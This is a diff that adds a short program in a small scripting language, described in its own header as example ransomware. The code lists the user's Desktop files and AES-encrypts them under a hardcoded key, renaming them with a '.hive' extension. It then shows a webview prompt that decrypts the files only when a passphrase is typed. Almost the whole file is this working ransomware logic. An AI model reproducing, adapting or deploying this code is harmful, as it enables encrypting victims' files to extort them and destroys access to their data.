@@ -1,0 +1,60 @@
+@ Warning: This is an example ransomware, in the case of accidental encryption know the following @
+@ 1. The encryption method is AES @
+@ 2. The key length is 16 bytes @
+@ 3. The encryption key used is hiveXXXXXXXXXXXX @
+@ 4. The ransomware only targets the current running users directory @
+
+use webview
+use system
+use crypto
+
+[
+    version 2.0
+    output alien
+    os linux
+    arch amd64
+    obfuscate false
+]
+
+c decrypt_files {
+    crypto::set_extension(".cleared")
+    crypto::set_aes_key("hiveXXXXXXXXXXXX")
+    crypto::set_method("aes")
+
+    system::list_dir("/home/€666€/Desktop") @ Puts the result into €1€ @
+    foreach("€1€"):
+        crypto::add_target("€13€") @ Add each file to our target list @
+    end foreach
+
+    crypto::decrypt()
+}
+
+b encrypt_files {
+    crypto::set_extension(".hive")
+    crypto::set_aes_key("hiveXXXXXXXXXXXX")
+    crypto::set_method("aes")
+
+    system::list_dir("/home/€666€/Desktop") @ Puts the result into €1€ @
+    foreach("€1€"):
+        system::outln("€13€")
+        crypto::add_target("€13€") @ Add each file to our target list @
+    end foreach
+
+    crypto::encrypt()
+}
+
+l webview_run {
+    webview::bind(${"decrypt", "decrypt_files"}$)
+
+    webview::js("function checking() { var input = document.getElementById('in').value; if (input === 'hive'){decrypt();}}")
+
+    webview::css("body{ background-image:url('<final url>'); background-repeat: no-repeat;  background-size: cover; background-position: center center; }")
+    webview::css("label{color: #555;}")
+
+    webview::html("<label for='in'>Input</label>")
+    webview::html("<input id='in' type='input'>")
+    webview::html("<input type='submit' onclick='checking()'>")
+
+    webview::run()
+    system::exit("0")
+}
